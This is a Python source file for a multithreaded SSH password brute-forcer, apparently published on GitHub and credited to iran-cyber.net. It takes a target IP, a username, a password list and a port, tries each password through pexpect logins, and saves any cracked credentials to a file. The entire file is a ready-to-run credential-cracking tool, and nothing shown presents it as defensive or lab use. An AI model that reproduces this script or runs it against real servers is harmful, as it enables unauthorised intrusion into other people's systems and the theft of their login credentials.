from threading import Thread
from os import system, name
import sys
import random
from time import sleep

try:
    from pexpect import pxssh
except ImportError:
    print("[-] first install modules")
    print("[+] pip install -r r.txt")
    sys.exit(1)

try:
    from colorama import Fore, Style
except ImportError:
    print("[-] first install modules")
    print("[+] pip install -r r.txt")
    sys.exit(1)

def cpage():
    if name =="nt":
        system("cls")
    else:
        system("clear")

def logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = r"""
 .oooooo..o          oooo        oooooooooo.     iran-cyber.net        .             
d8P'    `Y8          `888        `888'   `Y8b                        .o8             
Y88bo.       .oooo.o  888 .oo.    888     888 oooo d8b oooo  oooo  .o888oo  .ooooo.  
 `"Y8888o.  d88(  "8  888P"Y88b   888oooo888' `888""8P `888  `888    888   d88' `88b 
     `"Y88b `"Y88b.   888   888   888    `88b  888      888   888    888   888ooo888 
oo     .d8P o.  )88b  888   888   888    .88P  888      888   888    888 . 888    .o 
8""88888P'  8""888P' o888o o888o o888bood8P'  d888b     `V88V"V8P'   "888" `Y8bod8P' 

                                 SsH BruteForcer v1.0  | wrote by iwHH    
        
        github.com/iwhh/SshBrute                                         
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" %(random.choice(colors), line, clear))
        sleep(0.05)

def starter(TARGET, USER, PASS, PORT):
    try:
        _attack = pxssh.pxssh()
        _attack.login(TARGET, username=USER, password=PASS, port=PORT)
        print(f"{Fore.RED}================================")
        print(f"{Fore.BLUE}! Cracked !")
        print(f"{Fore.CYAN}ip : {Fore.GREEN} {TARGET}")
        print(f"{Fore.CYAN}username : {Fore.GREEN} {USER}")
        print(f"{Fore.CYAN}password : {Fore.GREEN} {PASS}")
        print(f"{Fore.CYAN}port : {Fore.GREEN} {PORT}")
        print(f"{Fore.RED}================================{Style.RESET_ALL}")
        _attack.logout()
        with open("Cracked.txt", mode="a") as e:
            e.write(f"ip : {TARGET}\nusername : {USER}\npassword : {PASS}\nport : {PORT}\n")
            e.close()
        sys.exit(1)
    except:
        print(f"{Fore.YELLOW}[{Fore.RED}-{Fore.YELLOW}]{Fore.CYAN} {PASS} {Fore.MAGENTA}-> {Fore.RED} No")

def main():

    try:
        getip = sys.argv[1]
        getuser = sys.argv[2]
        get_passlist = sys.argv[3]
        getport = sys.argv[4]
        cpage()
        logo()
    except IndexError:
        cpage()
        logo()
        print(f"\n{Fore.YELLOW}[{Fore.BLUE}!{Fore.YELLOW}]{Fore.CYAN} python {Fore.MAGENTA}{sys.argv[0]} {Fore.CYAN}targetip Username PasswordList Port")
        sys.exit(1)
    thread = []
    try:
        with open(get_passlist, mode="r") as e:
            reader = e.read().splitlines()
    except FileNotFoundError:
        print(f"{Fore.YELLOW}[{Fore.RED}-{Fore.YELLOW}]{Fore.CYAN}File {get_passlist} Not Found")
        sys.exit(1)
    for x in reader:
        thread = []

        t = Thread(target=starter, args=(getip, getuser, x, getport))
        t.start()
        thread.append(t)
        sleep(0.07)

        for m in thread:
            m.join
if __name__ == "__main__": main()